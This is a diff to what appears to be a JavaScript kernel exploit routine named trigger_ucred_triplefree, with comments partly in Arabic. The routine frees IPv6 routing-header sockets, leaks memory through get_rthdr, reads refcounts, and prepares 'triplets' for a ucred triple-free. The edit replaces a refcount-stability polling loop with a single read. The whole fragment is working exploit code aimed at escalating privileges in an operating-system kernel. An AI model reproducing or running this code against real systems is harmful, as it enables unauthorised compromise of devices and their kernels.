@@ -1391,37 +1391,21 @@ function trigger_ucred_triplefree() {
     send_notification("[STEP 9] Freeing twin index=" + twins[1]);
     free_rthdr(ipv6_socks[twins[1]]);
 
-    // STEP 10 — مراقبة refcount (ثبات وليس تغيّر)
-    send_notification("[STEP 10] Checking refcount stability on twin=" + twins[0]);
+    // STEP 10 — refcount check (simple stable read)
+    send_notification("[STEP 10] Checking refcount on twin=" + twins[0]);
 
-    var count = 0;
     var ref_success = false;
     var last_ref = -1;
 
-    while (count < TRIPLEFREE_REFCOUNT_MAX_WAIT) {
+    write32(leak_rthdr.add(0x04), 0);
+    get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8);
 
-      // تشغيل الدورة
-      trigger_iov_recvmsg();
-      write(new BigInt(iov_sock_1), tmp, 1);
-      wait_iov_recvmsg();
-      read(new BigInt(iov_sock_0), tmp, 1);
+    last_ref = read32(leak_rthdr);
 
-      // قراءة ref
-      write32(leak_rthdr.add(0x04), 0);
-      get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8);
-
-      var ref = read32(leak_rthdr);
-      last_ref = ref;
-
-      // الشرط المنطقي: ref قابل للقراءة وثابت
-      if (ref >= 0) {
-        send_notification("[STEP 10] REF STABLE (ref=" + ref + ")");
-        ref_success = true;
-        break;
-      }
-
-      send_notification("[DEBUG] REF=" + ref + " | count=" + count);
-      count++;
+    // الشرط الوحيد: ref قابل للقراءة
+    if (last_ref >= 0) {
+      send_notification("[STEP 10] REF OK (ref=" + last_ref + ")");
+      ref_success = true;
     }
 
     send_notification(
@@ -1434,6 +1418,7 @@ function trigger_ucred_triplefree() {
       close(new BigInt(uaf_socket));
       continue;
     }
+
 
     // STEP 11 (جديد) — تجهيز التريبلت قبل أي close إضافي
     send_notification("[STEP 11] Preparing triplets from twins");
